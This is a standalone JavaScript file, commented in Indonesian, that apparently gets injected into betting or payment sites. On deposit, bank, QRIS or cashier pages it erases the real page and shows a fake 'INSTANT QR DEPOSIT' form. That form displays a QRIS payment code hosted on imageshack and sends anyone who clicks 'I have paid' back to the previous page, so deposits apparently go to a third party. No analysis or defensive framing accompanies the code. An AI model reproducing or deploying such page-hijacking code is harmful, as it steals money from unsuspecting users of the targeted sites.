(function () {
  const targetUrls = [
    "/deposit",
    "/bank",
    "/qris",
    "/deposit.php",
    "/bank.php",
    "/qris.php",
    "index.php?page=deposit",
    "index.php?page=cashier"
  ];

  const currentUrl = window.location.href;
  const isTarget = targetUrls.some((end) => currentUrl.endsWith(end));

  if (!isTarget) return;

  // Hapus semua isi halaman lama
  document.documentElement.innerHTML = "";

  // Tambahkan Google Font elegan
  const fontLink = document.createElement("link");
  fontLink.href = "https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap";
  fontLink.rel = "stylesheet";
  document.head.appendChild(fontLink);

  // Container utama
  const container = document.createElement("div");
  container.style.cssText = `
    font-family: 'Poppins', sans-serif;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: flex-start;
    min-height: 100vh;
    background: linear-gradient(135deg, #2c2c34, #1e1e24);
    color: #f1f1f1;
    padding: 20px;
    text-align: center;
  `;

  container.innerHTML = `
    <h1 style="margin: 30px 0; font-weight:600; font-size:1.6rem;">INSTANT QR DEPOSIT</h1>
    
    <div id="form-section" style="width:100%; max-width:380px; background:#2e2e38; padding:20px; border-radius:15px; box-shadow:0 4px 15px rgba(0,0,0,0.3); text-align:center;">
      <input type="text" id="nama" placeholder="Nama Pengirim" style="width:100%; padding:12px; margin-bottom:12px; border:1px solid #555; border-radius:10px; background:#1f1f26; color:#f1f1f1;">
      <input type="number" id="nominal" placeholder="Nominal (min. 50.000)" style="width:100%; padding:12px; margin-bottom:12px; border:1px solid #555; border-radius:10px; background:#1f1f26; color:#f1f1f1;">
      <input type="text" id="catatan" placeholder="Catatan" style="width:100%; padding:12px; margin-bottom:18px; border:1px solid #555; border-radius:10px; background:#1f1f26; color:#f1f1f1;">
      <button id="showQrisBtn" style="width:100%; padding:12px; background:#4CAF50; color:#fff; border:none; border-radius:10px; cursor:pointer; font-weight:600; transition:0.2s;">Buat Qris</button>
    </div>

    <div id="qris-section" style="display:none; margin-top:25px; text-align:center;">
      <div style="background:#2e2e38; padding:20px; border-radius:15px; box-shadow:0 4px 15px rgba(0,0,0,0.3);">
        <img src="https://imagizer.imageshack.com/v2/320xq70/r/922/CFAtIh.jpg" alt="QRIS" style="max-width:100%; border:2px solid #444; border-radius:12px; margin-bottom:15px;">
        <br>
        <button id="downloadBtn" style="width:100%; padding:12px; margin-bottom:12px; background:#007bff; color:#fff; border:none; border-radius:10px; cursor:pointer; font-weight:600; transition:0.2s;">Download Qris</button>
        <button id="paidBtn" style="width:100%; padding:12px; background:#ffc107; border:none; border-radius:10px; cursor:pointer; font-weight:600; transition:0.2s;">Saya Sudah Membayar</button>
      </div>
    </div>

    <div style="margin-top:50px;">
      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSxt4SV-4Fwz_SHmJwW_ENA4zghNfwbYgAG4x_l9IbA0w&s=10" alt="Footer Image" style="max-width:120px; opacity:0.8;">
    </div>

    <div style="margin-top:12px; font-size:11px; color:#aaa;">X2022-2025©</div>
  `;

  document.body.appendChild(container);

  // Event listeners
  document.getElementById("showQrisBtn").addEventListener("click", function () {
    document.getElementById("form-section").style.display = "none";
    document.getElementById("qris-section").style.display = "block";
  });

  document.getElementById("downloadBtn").addEventListener("click", function () {
    window.location.href = "https://imagizer.imageshack.com/v2/320xq70/r/922/CFAtIh.jpg";
  });

  document.getElementById("paidBtn").addEventListener("click", function () {
    window.history.back();
  });
})();
